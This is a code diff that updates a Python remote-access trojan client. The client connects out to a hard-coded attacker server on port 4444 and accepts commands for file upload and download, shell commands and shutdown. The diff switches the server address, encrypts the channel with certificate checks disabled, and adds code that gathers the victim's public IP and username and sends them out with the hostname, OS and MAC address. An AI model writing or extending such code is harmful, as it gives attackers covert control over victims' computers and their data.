@@ -24,13 +24,13 @@ import time
 import sqlite3
 import os
 import shutil
-import winreg as reg
 import tkinter as tk
 import random
-
+import ssl
+import requests
 import logging
 
-ServerHost = "192.168.11.104"
+ServerHost = "100.94.242.9"
 ServerPort = 4444
 Buff = 1024
 
@@ -38,7 +38,18 @@ Buff = 1024
 def CreateSocket():
     global client_socket
     try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        plain_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        # Create an SSL context
+        context = ssl.create_default_context()
+
+        # Disable certificate verification (not recommended for production)
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+        # Wrap the plain socket with SSL
+        client_socket = context.wrap_socket(plain_socket, server_hostname=ServerHost)
+        print("Secure socket created successfully")
     except socket.error as msg:
         print("Socket creation error:", msg)
 
@@ -52,14 +63,27 @@ def ConnectToServer():
     except socket.error as msg:
         print("Connection error:", msg)
 
-
+def get_public_ip():
+    try:
+        response = requests.get('https://api.ipify.org')
+        if response.status_code == 200:
+            return response.text
+        else:
+            return "Unknown"
+    except Exception as e:
+        print("Error fetching public IP:", e)
+        return "Unknown"
 def send_info():
     global client_socket
     try:
         desktop_name = platform.node()
         operating_system = platform.platform()
         mac_address = getmac.get_mac_address()
-        client_socket.send(f"{desktop_name},{operating_system},{mac_address}".encode("utf-8"))
+        ip_address = get_public_ip()
+        user_name = os.getlogin()
+        data = f"{desktop_name},{operating_system},{mac_address},{ip_address},{user_name}"
+
+        client_socket.send(data.encode("utf-8"))
     except Exception as e:
         print("Error sending info:", e)
 
@@ -91,8 +115,8 @@ def send_file(filename):
 
 def receive_file(filename):
     global client_socket
-    file_size = client_socket.recv(Buff).decode("utf-8")
-    file_size = int(file_size)
+    size_bytes = client_socket.recv(4)
+    file_size = struct.unpack(">L", size_bytes)[0]
     time.sleep(1)
     try:
         received_size = 0
@@ -247,8 +271,9 @@ def get_local_ip():
 
 
 def show_message_box(text, title):
-    user32 = ctypes.WinDLL('user32')
-    user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
+    #user32 = ctypes.WinDLL('user32')
+    #user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
+    ctypes.windll.user32.MessageBoxW(0,text,title, 0x00000000 | 0x00000040)
 
 
 running = False
@@ -508,8 +533,12 @@ def main():
                     break
                 send_file(filename)
         elif command == "upload":
-            filename = client_socket.recv(1024).decode("utf-8")
-            receive_file(filename)
+            msg = client_socket.recv(1024).decode("utf-8")
+            if msg == "yes":
+                filename = client_socket.recv(1024).decode("utf-8")
+                receive_file(filename)
+            else:
+                pass
 
 
         elif command == "cmd":
@@ -543,8 +572,7 @@ def main():
         elif command == "shutdown":
             os.system("shutdown /s /t 1")
         elif command == "portscanner":
-            ip = get_local_ip()
-            client_socket.send(ip.encode('utf-8'))
+            pass
 
         elif command == "send_message":
             text = client_socket.recv(Buff).decode()
